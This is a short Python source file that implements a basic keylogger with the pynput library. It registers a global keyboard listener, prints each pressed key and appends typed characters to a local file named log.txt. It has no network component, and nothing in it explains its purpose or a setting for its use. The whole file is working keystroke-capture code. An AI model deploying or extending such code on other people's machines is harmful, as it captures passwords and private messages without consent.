from pynput import keyboard

def pressedKey(key):
    print(str(key))
    with open("log.txt", 'a') as f:
        try:
            char = key.char
            f.write(char)
        except:
            print("Error receiving character")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=pressedKey)
    listener.start()
    input()